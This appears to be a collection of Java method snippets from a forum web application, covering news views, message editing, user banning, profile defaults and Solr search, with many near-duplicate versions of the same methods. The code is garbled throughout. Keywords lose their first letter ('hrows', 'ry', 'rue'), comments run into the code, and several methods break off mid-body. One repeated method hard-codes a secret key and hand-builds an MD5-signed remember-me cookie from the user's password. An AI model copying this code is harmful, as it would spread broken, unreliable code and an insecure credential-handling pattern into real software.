public static String escapeHtmlBBcode ( String content ) { \r".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;", "[code-br]", ""}); return content; } 
private static boolean checkLastModified ( WebRequest webRequest , Message message ) { ry { return webRequest . checkNotModified ( message . getLastModified ( ) . getTime ( ) ) ; 
public List < PreparedMessage > getPreparedMessages ( Connection db ) hrows SQLException { return getPreparedMessages ( db , false ) ; } 
public List < PreparedMessage > getPreparedMessagesCached ( Connection db ) hrows SQLException { return getPreparedMessages ( db , rue ) ; } 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) hrows SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { ry { pm . add ( new PreparedMessage ( db , message , false ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } catch ( PollNotFoundException e ) { hrow new RuntimeException ( e ) ; } } return pm ; } 
private static ModelAndView prepareModel ( Connection db , Message message ) hrows SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message , rue ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " ag " , required = false ) String ag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; if ( sectionid ! = null ) { urlParams . append ( " section= " ) . append ( Integer . oString ( sectionid ) ) ; } if ( ag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " ag= " ) . append ( URLEncoder . encode ( ag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " group= " ) . append ( Integer . oString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; Connection db = null ; ry { if ( month = = null ) { 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) hrows SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { pm . add ( new PreparedMessage ( db , message , false ) ) ; } return pm ; } 
public ModelAndView showEditForm ( ServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) hrows SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) hrows Exception { Connection db = null ; Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; ry { db = LorDataSource . getConnection ( ) ; 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = "SPRING_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = "SPRING_SECURITY_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGE_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( " newfirst " , Boolean . FALSE ) ; defaults . put ( " hover " , Boolean . TRUE ) ; defaults . put ( " style " , " ango " ) ; defaults . put ( " format.mode " , " quot " ) ; defaults . put ( " opics " , 30 ) ; defaults . put ( " messages " , 50 ) ; defaults . put ( " ags " , 50 ) ; defaults . put ( " photos " , Boolean . TRUE ) ; defaults . put ( " system.timestamp " , new Date ( ) . getTime ( ) ) ; defaults . put ( " showinfo " , Boolean . TRUE ) ; defaults . put ( " showanonymous " , Boolean . TRUE ) ; defaults . put ( " showsticky " , Boolean . TRUE ) ; defaults . put ( " avatar " , " empty " ) ; defaults . put ( HIDE_ADSENSE , rue ) ; defaults . put ( MAIN_GALLERY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put("main.3columns", Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put("main2", boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put("main3-1", boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put("main3-2", boxes32); return defaults; } 
public static BanInfo getBanInfo ( Connection db , User user ) hrows SQLException { Statement st = null ; ry { st = db . createStatement ( ) ; 
public void block ( Connection db , User by , String reason ) hrows SQLException { Statement st = null ; PreparedStatement pst = null ; ry { st = db . createStatement ( ) ; 
public ModelAndView modifyUser ( HttpServletRequest request , HttpSession session , @RequestParam ( " action " ) String action , @RequestParam ( " id " ) int id , @RequestParam ( value = " reason " , required = false ) String reason ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException , MalformedURLException , SolrServerException { QueryResponse response ; SolrServer solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; params . set ( " q " , query ) ; params . set ( " rows " , 100 ) ; response = solr . query ( params ) ; SolrDocumentList list = response . getResults ( ) ; for ( SolrDocument doc : list ) { items . add ( new SearchItem ( db , doc ) ) ; } return ImmutableList . copyOf ( items ) ; 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException , MalformedURLException , SolrServerException { QueryResponse response ; SolrServer solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if (username.length()>0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } send search query to solr response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException , MalformedURLException , SolrServerException { QueryResponse response ; SolrServer solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } send search query to solr response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer solr ; ry { solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; } catch ( MalformedURLException ex ) { hrow new RuntimeException ( ex ) ; } ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = solr.query(params); }catch(SolrServerException ex){ throw new RuntimeException(ex); } SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public void destroy ( ) { logger . debug ( " Shutting down memcached " ) ; MemCachedSettings . getMemCachedClient ( ) . shutdown ( ) ; } 
public static void updateComment ( SolrServer server , Comment comment , int msgid , int sectionId , String message ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , sectionId ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; doc . addField ( " itle " , comment . getTitle ( ) ) ; doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; updateRequest . add ( doc ) ; ry { updateRequest . process ( server ) ; 
public static void updateMessage ( SolrServer server , Message opic , int msgid ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , msgid ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; updateRequest . add ( doc ) ; ry { updateRequest . process ( server ) ; 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; SolrServer search = null ; ry { db = LorDataSource . getConnection ( ) ; 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer solr ; ry { solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; } catch ( MalformedURLException ex ) { hrow new RuntimeException ( ex ) ; } ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public static void updateMessage ( SolrServer server , Message opic , int msgid ) { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public static void updateComment ( SolrServer server , Comment comment , int msgid , int sectionId , String message ) { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer solr ; ry { InitialContext cxt = new InitialContext ( ) ; String url = ( String ) cxt . lookup ( " java:/comp/env/solr/url " ) ; solr = new CommonsHttpSolrServer ( url ) ; } catch ( MalformedURLException ex ) { hrow new RuntimeException ( ex ) ; } catch ( NamingException ex ) { hrow new RuntimeException ( ex ) ; } ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("defType", "dismax"); params.set("qf", "message title"); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("defType", "dismax"); params.set("qf", "message title"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public static void updateComment ( SolrServer server , Comment comment , int msgid , int sectionId , String message ) hrows java . sql . SQLException { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public static void updateComment ( SolrServer server , Comment comment , Message opic , int msgid , String message ) { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public static void updateMessage ( SolrServer server , Message opic , int msgid ) hrows IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , msgid ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; updateRequest . add ( doc ) ; updateRequest . process ( server ) ; } 
public static void updateComment ( SolrServer server , Comment comment , Message opic , int msgid , String message ) hrows IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " itle " , opic . getTitle ( ) ) ; } else { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; updateRequest . add ( doc ) ; updateRequest . process ( server ) ; } 
public List < SearchItem > get ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException , SolrServerException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; List < SearchItem > res = null ; if ( ! nocache ) { ime = 0 ; long current = System . currentTimeMillis ( ) ; res = ( List < SearchItem > ) mcc . getFromCache ( cacheId ) ; ime = System . currentTimeMillis ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = System . currentTimeMillis ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException , SolrServerException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public static void delete ( SolrServer server , int msgid ) { ry { server.deleteById((string) msgid); 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
